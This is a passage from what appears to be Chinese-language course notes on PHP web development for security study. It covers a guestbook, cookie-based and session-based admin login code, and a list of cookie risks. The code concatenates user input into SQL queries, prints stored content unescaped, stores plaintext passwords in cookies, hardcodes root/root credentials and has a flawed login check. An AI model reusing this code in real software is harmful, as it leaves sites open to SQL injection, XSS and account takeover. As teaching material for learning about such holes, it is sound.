class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;./ueditor/ueditor.config.js&quot;&gt;/*引入配置文件*/&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;./ueditor/ueditor.all.js&quot;&gt;/*引入源码文件*/&lt;/script&gt;</span><br><span class="line">&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">    内容：</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;p&gt;</span><br><span class="line">           &lt;textarea id=&quot;content&quot; rows=&quot;10&quot; cols=&quot;70&quot; name=&quot;content&quot; style=&quot;border:1px solid #E5E5E5;&quot;&gt;</span><br><span class="line">    &lt;/textarea&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        UE.getEditor(&quot;content&quot;);</span><br><span class="line"></span><br><span class="line">        //实例化编辑器传参,id为将要被替换的容器。</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">/*// 使用 mysqli_connect() 函数建立与数据库的连接</span><br><span class="line">// $dbip: 数据库服务器的 IP 地址或主机名</span><br><span class="line">// $dbuser: 数据库用户名</span><br><span class="line">// $dbpass: 数据库用户的密码</span><br><span class="line">// $dbname: 要连接的数据库名*/</span><br><span class="line"></span><br><span class="line">/*$dbip=&#x27;localhost&#x27;;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">dbuser=<span class="string">&#x27;root&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">dbpass=<span class="string">&#x27;root&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">dbname=<span class="string">&#x27;dome01&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">con=mysqli_connect(<span class="variable">$dbip</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>,<span class="variable">$dbname</span>);*/</span></span><br><span class="line">include &#x27;config.php&#x27;;</span><br><span class="line"></span><br><span class="line">//添加留言</span><br><span class="line">function add_gbook($con)&#123;</span><br><span class="line">    $u=@$_POST[&#x27;username&#x27;];</span><br><span class="line">    if (!empty($u)) &#123;</span><br><span class="line"></span><br><span class="line">        $c = @$_POST[&#x27;content&#x27;];</span><br><span class="line">        $i = @$_SERVER[&#x27;REMOTE_ADDR&#x27;]; /*获取客户端 IP 地址*/</span><br><span class="line">        $ua = @$_SERVER[&#x27;HTTP_USER_AGENT&#x27;];/*获取客户端用户代理信息*/</span><br><span class="line">        // 数据库查询语句，将数据插入到名为 gbook 的表中</span><br><span class="line">        $sql = &quot;insert into gbook(`username`, `content`,`ipaddr`,`uagent`) value(&#x27;$u&#x27;, &#x27;$c&#x27;,&#x27;$i&#x27;,&#x27;$ua&#x27;);&quot;;</span><br><span class="line">        if (mysqli_query($con, $sql)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#x27;留言成功！&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//显示留言</span><br><span class="line">function  show_gbook($con,$del)</span><br><span class="line">&#123;</span><br><span class="line">    $sql1=&quot;select * from gbook&quot;;</span><br><span class="line">    $data=mysqli_query($con,$sql1);</span><br><span class="line">    while ($row=mysqli_fetch_row($data)) &#123;</span><br><span class="line">        echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">        echo &#x27;用户名：&#x27; . $row[0] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;内容：&#x27; . $row[1] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;IP地址：&#x27; . $row[2] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        echo &#x27;UA浏览器：&#x27; . $row[3] . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        //检查变量 $del 是否等于字符串 &#x27;del&#x27;。如果条件成立，就会生成一个包含删除链接的 HTML 代码。</span><br><span class="line">        //提供删除链接，传递留言用户名作为参数</span><br><span class="line">        if ($del==&#x27;del&#x27;)&#123;</span><br><span class="line">            echo &quot;&lt;a href=&#x27;gbook-admin.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">add_gbook($</span><span class="language-bash">con);</span></span><br><span class="line">// 调用显示留言的函数，传递 &#x27;x&#x27; 参数</span><br><span class="line"><span class="meta prompt_">show_gbook($</span><span class="language-bash">con,<span class="string">&#x27;x&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>gbook-admin.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 包含数据库配置文件</span><br><span class="line">include &#x27;../config.php&#x27;;</span><br><span class="line">// 包含处理留言的功能文件</span><br><span class="line">include &#x27;../gbook.php&#x27;;</span><br><span class="line"></span><br><span class="line">// 调用显示留言的函数，传递 &#x27;del&#x27; 参数，以显示删除链接</span><br><span class="line"><span class="meta prompt_">show_gbook($</span><span class="language-bash">con,<span class="string">&#x27;del&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line">// 获取要删除的留言用户名</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">delstr=@<span class="variable">$_GET</span>[<span class="string">&#x27;del&#x27;</span>];</span></span><br><span class="line">// 检查是否设置了要删除的留言用户名</span><br><span class="line"><span class="meta prompt_">if(isset($</span><span class="language-bash">delstr))&#123;</span></span><br><span class="line">    // 构建删除留言的 SQL 查询语句</span><br><span class="line">    $sql2=&quot;delete from gbook where username =&#x27;$delstr&#x27;;&quot;;</span><br><span class="line">// 执行删除操作</span><br><span class="line">    if(mysqli_query($con,$sql2))&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;删除成功 ！&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 查询所有留言</span><br><span class="line">/*$sql1=&quot;select * from gbook&quot;;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql1</span>);</span></span><br><span class="line">// 循环遍历每条留言并显示信息和删除链接</span><br><span class="line">while ($row=mysqli_fetch_row($data))&#123;</span><br><span class="line">    echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">    echo &#x27;用户名：&#x27;.$row[0].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo &#x27;内容：&#x27;.$row[1].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo &#x27;IP地址：&#x27;.$row[2].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo &#x27;UA浏览器：&#x27;.$row[3].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    // 提供删除链接，传递留言用户名作为参数</span><br><span class="line">    echo &quot;&lt;a href=&#x27;gbook-admin.php?del=$row[0]&#x27;&gt;删除&lt;/a&gt;&quot;;</span><br><span class="line">&#125;*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p>config.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $dbip = &#x27;localhost&#x27;;</span><br><span class="line">    $dbuser = &#x27;root&#x27;;</span><br><span class="line">    $dbpass = &#x27;root&#x27;;</span><br><span class="line">    $dbname = &#x27;test&#x27;;</span><br><span class="line">    $con = mysqli_connect($dbip, $dbuser, $dbpass, $dbname);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><p>PHP应用&amp;后台模&amp;Session&amp;Cookie&amp;Token&amp;<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81&spm=1001.2101.3001.7020">身份验证</a>&amp;唯一性</p>
<h3 id="Cookie技术"><a href="#Cookie技术" class="headerlink" title="Cookie技术"></a><strong>Cookie技术</strong></h3><p><img src="/img/xiaodi/dea062d483cfdbeb057eddd2171caacb.png" alt="Untitled"></p>
<p><img src="/img/xiaodi/827677792c99539271ce2c85290addbd.png" alt="Untitled"></p>
<blockquote>
<p>Cookie产生原理图：</p>
<p>1、客户端向服务器发送HTTP请求。<br>2、服务器检查请求头中是否包含cookie信息。<br>3、如果请求头中包含cookie信息，则服务器使用该cookie来识别客户端，否则服务器将生成一个新的cookie。<br>4、服务器在响应头中设置cookie信息并将其发送回客户端。<br>5、客户端接收响应并将cookie保存在本地。<br>6、当客户端发送下一次HTTP请求时，它会将cookie信息附加到请求头中。<br>7、服务器收到请求并检查cookie的有效性。<br>8、如果cookie有效，则服务器响应请求。否则，服务器可能会要求客户端重新登录。</p>
</blockquote>
<p>建立cookie：setcookie()</p>
<p>删除cookie：unset()</p>
<h4 id="创建php文件"><a href="#创建php文件" class="headerlink" title="创建php文件"></a>创建php文件</h4><ul>
<li>admin-c.php登陆文件</li>
<li>index-c.php登录成功的首页文件</li>
<li>logout-c.php登出文件</li>
</ul>
<p>admin-c.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: #f4f4f4;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            width: 300px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: 8px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-bottom: 16px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button &#123;</span><br><span class="line">            background-color: #4caf50;</span><br><span class="line">            color: #fff;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: 100%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: #45a049;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--//你需要在实际应用中将登录表单的 action</span><br><span class="line">//属性指向后台处理登录的脚本（例如 login.php）</span><br><span class="line">//由于当前就是登录文件为空即可--&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;../config.php&quot;;</span><br><span class="line">//登陆文件</span><br><span class="line">/*</span><br><span class="line"> * 1.接收输入账号密码</span><br><span class="line"> * 2.判断账号密码是否正确</span><br><span class="line"> * 3.正确后生成cookie进行保存</span><br><span class="line"> * 4.错误的账户密码进行提示</span><br><span class="line"> * 5.跳转至成功页面</span><br><span class="line"> */</span><br><span class="line">//1.接收输入账号密码</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">user=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">pass=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span></span><br><span class="line">//2.进行判断账号密码是否正确</span><br><span class="line">// 构建 SQL 查询语句，用于判断账号密码是否正确</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sql = <span class="string">&quot;SELECT * FROM admin WHERE username=&#x27;<span class="variable">$user</span>&#x27; AND password=&#x27;<span class="variable">$pass</span>&#x27;;&quot;</span>;</span></span><br><span class="line">//echo $sql;</span><br><span class="line"></span><br><span class="line">// 执行 SQL 查询</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">data = mysqli_query(<span class="variable">$con</span>, <span class="variable">$sql</span>);</span></span><br><span class="line"></span><br><span class="line">// 判断请求是否为 POST</span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    // 检查查询结果行数是否大于 0</span><br><span class="line">    if (mysqli_num_rows($data) &gt; 0) &#123;</span><br><span class="line">        $expire = time() + 60 * 60 * 24 * 30; // 设置 Cookie 过期时间为一个月后</span><br><span class="line">        setcookie(&#x27;username&#x27;, $user, $expire, &#x27;/&#x27;); // 设置用户名 Cookie</span><br><span class="line">        setcookie(&#x27;password&#x27;, $pass, $expire, &#x27;/&#x27;); // 设置密码 Cookie</span><br><span class="line"></span><br><span class="line">        // 重定向到 index-c.php 页面</span><br><span class="line">        header(&#x27;Location: index-c.php&#x27;);</span><br><span class="line">        exit();  // 终止脚本执行</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#x27;登录失败！&#x27;)&lt;/script&gt;&quot;; // 输出登录失败的提示</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>index-c.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//登录成功的首页文件</span><br><span class="line">if ($_COOKIE[&#x27;username&#x27;]!=&#x27;admin&#x27; and $_COOKIE[&#x27;password&#x27;]!=&#x27;123456&#x27;)</span><br><span class="line">    // 重定向到 index-c.php 页面</span><br><span class="line">    header(&#x27;Location: index-c.php&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台首页&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;后台首页&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;欢迎您，&lt;?php echo $_COOKIE[&#x27;username&#x27;]; ?&gt;！&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;a href=&quot;logout-c.php&quot;&gt;退出登录&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>logout-c.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&#x27;username&#x27;, &#x27;&#x27;, time() - 3600, &#x27;/&#x27;);</span><br><span class="line">setcookie(&#x27;password&#x27;, &#x27;&#x27;, time() - 3600, &#x27;/&#x27;);</span><br><span class="line">// 跳转到登录页面</span><br><span class="line">header(&#x27;Location: admin-c.php&#x27;);</span><br><span class="line">exit;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<p><strong>cookie安全性</strong></p>
<ol>
<li>信息泄露：如果Cookie中包含敏感信息（如用户ID、密码等），攻击者可以通过窃取Cookie来获取这些敏感数据。为了防止信息泄露，应确保敏感信息在传输和存储过程中进行加密，并使用安 全的传输协议（如HTTPS）来保护Cookie的传输过程。</li>
<li>跨站点脚本攻击（XSS）：攻击者可以通过在Web应用程序中注入恶意脚本来获取用户的Cookie。为了防止XSS攻击，开发人员应对用户输入进行正确的验证和过滤，并对输出进行适当的转义，以防止恶意脚本的注入。</li>
<li>跨站点请求伪造（CSRF）：攻击者可以通过欺骗用户访问恶意网站来利用用户的身份进行非法操作。为了防止CSRF攻击，可以使用随机生成的令牌（CSRF令牌）来验证每个请求的合法性，并确保令牌在每个请求中都是唯一且难以预测的。</li>
<li>会话劫持：攻击者可以通过窃取用户的会话Cookie来冒充用户身份。为了防止会话劫持，可以通过使用安全标志（如”Secure”和”HttpOnly”）来限制Cookie的使用范围，并在会话身份验证上使用额外的保护措施，如双因素身份验证。</li>
<li>不安全的存储：如果Cookie存储在用户计算机上的不安全位置，如明文存储或不加密的存储，攻击者可以轻易地访问和修改Cookie。为了保护Cookie的存储，应将Cookie存储在安全的位置，如服务器端的数据库或加密的本地存储。</li>
</ol>
<h3 id="Session技术"><a href="#Session技术" class="headerlink" title="Session技术"></a>Session技术</h3><p><strong>Session产生原理</strong></p>
<p>1、客户端向服务器发送HTTP请求。<br>2、服务器为客户端生成一个唯一的session ID，并将其存储在服务器端的存储器中（如文件、数据库等）。<br>3、服务器将生成的session ID作为一个cookie发送给客户端。<br>4、客户端将session ID保存为一个cookie，通常是在本地浏览器中存储。<br>5、当客户端在发送下一次HTTP请求时，它会将该cookie信息附加到请求头中，以便服务器可以通过该session ID来识别客户端。<br>6、服务器使用session ID来检索存储在服务器端存储器中的与该客户端相关的session数据，从而在客户端和服务器之间共享数据</p>
<blockquote>
<p>session_start(): 启动会话，用于开始或恢复一个已经存在的会话。<br>$_SESSION: 用于存储和访问当前会话中的所有变量。<br>session_destroy(): 销毁当前会话中的所有数据。<br>session_unset(): 释放当前会话中的所有变量。<br>Session存储路径：PHP.INI中session.save_path设置路径：</p>
</blockquote>
<h4 id="创建php文件-1"><a href="#创建php文件-1" class="headerlink" title="创建php文件"></a>创建php文件</h4><p>admin-s.php</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;后台登录&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: #f4f4f4;</span><br><span class="line">            margin: 0;</span><br><span class="line">            padding: 0;</span><br><span class="line">            display: flex;</span><br><span class="line">            align-items: center;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        form &#123;</span><br><span class="line">            background-color: #fff;</span><br><span class="line">            border-radius: 8px;</span><br><span class="line">            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);</span><br><span class="line">            padding: 20px;</span><br><span class="line">            width: 300px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            margin-bottom: 8px;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        input &#123;</span><br><span class="line">            width: 100%;</span><br><span class="line">            padding: 8px;</span><br><span class="line">            margin-bottom: 16px;</span><br><span class="line">            box-sizing: border-box;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button &#123;</span><br><span class="line">            background-color: #4caf50;</span><br><span class="line">            color: #fff;</span><br><span class="line">            padding: 10px;</span><br><span class="line">            border: none;</span><br><span class="line">            border-radius: 4px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">            width: 100%;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        button:hover &#123;</span><br><span class="line">            background-color: #45a049;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--//你需要在实际应用中将登录表单的 action</span><br><span class="line">//属性指向后台处理登录的脚本（例如 login.php）</span><br><span class="line">//由于当前就是登录文件为空即可--&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    &lt;label for=&quot;username&quot;&gt;用户名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;label for=&quot;password&quot;&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span><br><span class="line"></span><br><span class="line">    &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;../config.php&quot;;</span><br><span class="line">//登陆文件,使用session验证</span><br><span class="line">/*</span><br><span class="line"> * 1.接收输入账号密码</span><br><span class="line"> * 